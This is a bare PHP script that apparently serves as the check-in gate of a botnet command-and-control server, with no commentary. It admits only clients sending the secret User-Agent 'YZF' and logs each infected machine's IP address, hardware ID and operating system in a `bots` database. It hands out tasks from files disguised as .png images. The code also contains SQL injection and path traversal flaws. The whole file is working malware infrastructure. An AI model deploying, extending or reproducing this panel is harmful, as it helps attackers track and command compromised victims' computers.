<?php
	If ($_SERVER['HTTP_USER_AGENT']=="YZF")
	{
		$ip		=$_SERVER['REMOTE_ADDR'];
		$OS		=$_POST['os'];
		$hwid	=$_POST['id'];
			If ( (isset($OS)) and (isset($hwid)) )
			{
				echo file_get_contents("sys/threads.png").chr(13).chr(10).file_get_contents("sys/tasks.png");
				include "cfg.php";
				$bd=mysql_connect($host, $user, $pass);
				mysql_select_db($base);	
					If (mysql_num_rows(mysql_query("select * from `bots` where hwid=".$hwid))!=0)
					{
						mysql_query("update `bots` set `time`=".time()." where hwid=".$hwid);
					}
					else
					{
						mysql_query("Insert into `bots` (`ip`,`hwid`,`os`,`time`) values ('".$ip."','".$hwid."','".$OS."', '".time()."')");
					}
				mysql_close($bd);
				exit;
			}
			$headers=$_POST['headers'];
			If (isset($headers))
			{
			echo file_get_contents("sys/".$_POST['headers'].".png");
			exit;
			}	
	}
        else
        {
           echo "You blocked";
        }
?>
